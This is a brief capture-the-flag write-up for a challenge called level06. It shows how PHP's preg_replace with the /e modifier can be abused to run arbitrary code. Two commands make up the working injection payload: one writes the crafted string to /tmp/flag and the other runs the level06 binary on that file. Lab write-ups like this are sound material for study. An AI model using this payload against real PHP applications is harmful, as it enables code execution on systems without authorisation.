# Level06

We'll exploit `level06` script by using the unsecure call to `preg_replace` with the `/e` modifier. This modifier allows the replacement code to be executed as php code.
>`echo '[x {${exec(getflag)}}]' > /tmp/flag`
>`./level06 /tmp/flag`
